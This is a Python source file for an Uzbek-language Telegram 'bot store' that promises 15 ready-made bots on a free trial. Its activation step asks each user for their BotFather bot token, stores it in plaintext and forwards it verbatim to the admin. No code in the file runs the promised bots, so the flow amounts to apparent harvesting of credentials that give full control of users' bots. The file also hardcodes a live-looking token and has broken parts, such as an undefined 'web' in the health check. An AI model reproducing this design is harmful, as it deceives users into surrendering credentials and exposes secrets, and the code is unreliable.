# BOT STORE UZ - Asosiy Do'kon Boti
import os, sqlite3, asyncio
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Konfiguratsiya
TOKEN = "8753320110:AAHdQQrFYZcnxtx6PHaZdytHQoStDS3DuiA"
ADMIN_ID = 6639130930

# Database
conn = sqlite3.connect('botstore.db', check_same_thread=False)
cursor = conn.cursor()
cursor.executescript('''
    CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, full_name TEXT, balance INTEGER DEFAULT 0);
    CREATE TABLE IF NOT EXISTS subscriptions (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, bot_type TEXT, bot_token TEXT, bot_username TEXT, status TEXT DEFAULT 'active', start_date TEXT, end_date TEXT);
    CREATE TABLE IF NOT EXISTS payments (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, date TEXT);
''')
conn.commit()

# Botlar katalogi
BOTS = {
    "weather": {"name": "🌤 Ob-havo Boti", "price": 300, "desc": "Shahar ob-havosi, 7 kunlik prognoz"},
    "currency": {"name": "💱 Valyuta Konvertori", "price": 300, "desc": "Real-time 150+ valyuta kurslari"},
    "translator": {"name": "🌍 Tarjimon Bot", "price": 300, "desc": "100+ tilga professional tarjima"},
    "todo": {"name": "✅ Todo List", "price": 300, "desc": "Vazifalar ro'yxati va eslatmalar"},
    "qr": {"name": "📱 QR Code Generator", "price": 300, "desc": "QR kod yaratish va logotip qo'shish"},
    "prayer": {"name": "🕌 Namoz Vaqtlari", "price": 300, "desc": "Aniq namoz vaqtlari, qibla yo'nalishi"},
    "news": {"name": "📰 Yangiliklar", "price": 300, "desc": "Eng so'nggi yangiliklar agregatori"},
    "calculator": {"name": "🔢 Smart Kalkulyator", "price": 300, "desc": "Matematik amallar, konvertatsiya"},
    "reminder": {"name": "⏰ Eslatma Boti", "price": 300, "desc": "Muhim sanalar va takroriy eslatmalar"},
    "quiz": {"name": "🎮 Viktorina", "price": 300, "desc": "Bilim sinovlari va reyting tizimi"},
    "downloader": {"name": "📥 Media Yuklovchi", "price": 300, "desc": "YouTube, Instagram, TikTok yuklash"},
    "stats": {"name": "📊 Kanal Statistikasi", "price": 300, "desc": "Obunachilar o'sishi, post analitikasi"},
    "moderator": {"name": "🛡 Guruh Moderatori", "price": 300, "desc": "Spam filtr, avto-ban, xush kelibsiz"},
    "image_editor": {"name": "🖼 Rasm Muharriri", "price": 300, "desc": "Filtrlar, matn yozish, stiker yasash"},
    "random": {"name": "🎲 Tasodifiy Generator", "price": 300, "desc": "Random sonlar, tanlash g'ildiragi"}
}

# Asosiy menyu
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    cursor.execute("INSERT OR IGNORE INTO users (user_id, username, full_name) VALUES (?, ?, ?)", 
                   (user.id, user.username, user.full_name))
    conn.commit()
    
    text = f"🎉 *BOT STORE UZ* ga xush kelibsiz, {user.first_name}!\n\n📦 15 ta professional bot\n✅ 7 kun BEPUL sinov\n💰 Keyin kuniga 300 so'm"
    
    keyboard = [
        [InlineKeyboardButton("🛍 BOTLAR KATALOGI", callback_data="catalog")],
        [InlineKeyboardButton("📦 MENING BOTLARIM", callback_data="my_bots")],
        [InlineKeyboardButton("💰 BALANS", callback_data="balance")],
        [InlineKeyboardButton("📞 YORDAM", callback_data="help")]
    ]
    if user.id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("👨‍💼 ADMIN", callback_data="admin")])
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# Katalog
async def catalog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "🎯 *BOTLAR KATALOGI*\n\n7 kun BEPUL | 300 so'm/kun\n\nBotni tanlang:"
    keyboard = []
    
    for bot_id, bot in BOTS.items():
        keyboard.append([InlineKeyboardButton(f"{bot['name']} | 300 so'm", callback_data=f"info_{bot_id}")])
    
    keyboard.append([InlineKeyboardButton("◀️ BOSH MENYU", callback_data="main_menu")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# Bot haqida
async def bot_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    bot_id = query.data.replace("info_", "")
    bot = BOTS[bot_id]
    
    text = f"*{bot['name']}*\n\n📝 {bot['desc']}\n💰 Narx: {bot['price']} so'm/kun\n🆓 7 kun BEPUL"
    
    keyboard = [
        [InlineKeyboardButton("🚀 7 KUN BEPUL FAOLSHTIRISH", callback_data=f"activate_{bot_id}")],
        [InlineKeyboardButton("◀️ KATALOGGA QAYTISH", callback_data="catalog")]
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# Faollashtirish
async def activate_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    bot_id = query.data.replace("activate_", "")
    
    cursor.execute("SELECT * FROM subscriptions WHERE user_id = ? AND bot_type = ? AND status = 'active'", (user_id, bot_id))
    if cursor.fetchone():
        await query.edit_message_text("❌ Siz bu botni allaqachon olgansiz!\n📦 /mybots")
        return
    
    context.user_data['activating'] = bot_id
    
    await query.edit_message_text(
        "🔑 *Botni faollashtirish:*\n\n"
        "1️⃣ @BotFather'ga o'ting\n"
        "2️⃣ /newbot buyrug'ini bering\n"
        "3️⃣ Bot yarating\n"
        "4️⃣ Olingan TOKENni menga yuboring\n\n"
        "⚠️ Token namunasi:\n"
        "`1234567890:AAHdqTcvCHrT...`",
        parse_mode='Markdown'
    )

# Token qabul qilish
async def receive_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'activating' not in context.user_data:
        await update.message.reply_text("Iltimos avval bot tanlang: /start")
        return
    
    user_id = update.message.from_user.id
    token = update.message.text.strip()
    bot_id = context.user_data['activating']
    
    try:
        from telegram import Bot
        temp = Bot(token=token)
        info = await temp.get_me()
        
        start = datetime.now()
        end = start + timedelta(days=7)
        
        cursor.execute(
            "INSERT INTO subscriptions (user_id, bot_type, bot_token, bot_username, start_date, end_date) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, bot_id, token, info.username, start.isoformat(), end.isoformat())
        )
        conn.commit()
        
        del context.user_data['activating']
        
        # Admin'ga xabar
        await context.bot.send_message(
            ADMIN_ID,
            f"🆕 Yangi faollashtirish!\n👤 ID: `{user_id}`\n🤖 {BOTS[bot_id]['name']}\n🔑 Token: `{token}`\n📅 Tugash: {end.strftime('%d.%m.%Y')}",
            parse_mode='Markdown'
        )
        
        await update.message.reply_text(
            f"✅ *TABRIKLAYMIZ!*\n\n🤖 Bot: @{info.username}\n📅 Bepul: {end.strftime('%d.%m.%Y')} gacha\n⏰ 24/7 ishlaydi!\n\nSavollar: /help",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Xatolik! Token noto'g'ri.\n\n{str(e)[:100]}\n\nQayta urining!")

# Mening botlarim
async def my_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    cursor.execute("SELECT * FROM subscriptions WHERE user_id = ?", (user_id,))
    subs = cursor.fetchall()
    
    if not subs:
        await query.edit_message_text("📦 Hali botlaringiz yo'q!\n🛍 /catalog", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛍 Katalogga o'tish", callback_data="catalog")]]))
        return
    
    text = "📦 *MENING BOTLARIM*\n\n"
    keyboard = []
    
    for sub in subs:
        bot = BOTS.get(sub[2])
        if bot:
            days = (datetime.fromisoformat(sub[6]) - datetime.now()).days
            text += f"✅ {bot['name']}\n⏳ Qolgan: {max(0, days)} kun\n🤖 @{sub[5]}\n\n"
    
    keyboard.append([InlineKeyboardButton("🛍 Yangi bot olish", callback_data="catalog")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# Balans
async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    bal = cursor.fetchone()
    balance_amount = bal[0] if bal else 0
    
    await query.edit_message_text(
        f"💰 Balans: {balance_amount} so'm\n\nTo'lov uchun: @admin_username",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ ORQAGA", callback_data="main_menu")]])
    )

# Yordam
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "📞 *YORDAM*\n\n❓ Bot tanlang\n🔑 @BotFather'dan token oling\n📤 Tokenni yuboring\n✅ Bot ishga tushadi!\n\nAdmin: @bexruz_admin",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ ORQAGA", callback_data="main_menu")]])
    )

# Admin
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != ADMIN_ID:
        return
    
    cursor.execute("SELECT COUNT(*) FROM users")
    users = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(*) FROM subscriptions WHERE status='active'")
    active = cursor.fetchone()[0]
    
    await query.edit_message_text(
        f"👨‍💼 *ADMIN*\n\n👥 Foydalanuvchilar: {users}\n🤖 Aktiv botlar: {active}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ ORQAGA", callback_data="main_menu")]])
    )

# Health check
async def health(request):
    return web.Response(text="OK")

# Asosiy
def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(catalog, pattern="^catalog$"))
    app.add_handler(CallbackQueryHandler(bot_info, pattern="^info_"))
    app.add_handler(CallbackQueryHandler(activate_bot, pattern="^activate_"))
    app.add_handler(CallbackQueryHandler(my_bots, pattern="^my_bots$"))
    app.add_handler(CallbackQueryHandler(balance, pattern="^balance$"))
    app.add_handler(CallbackQueryHandler(help_cmd, pattern="^help$"))
    app.add_handler(CallbackQueryHandler(start, pattern="^main_menu$"))
    app.add_handler(CallbackQueryHandler(admin, pattern="^admin$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_token))
    
    print("🚀 Bot Store Uz ishga tushdi!")
    app.run_polling()

if __name__ == "__main__":
    main()
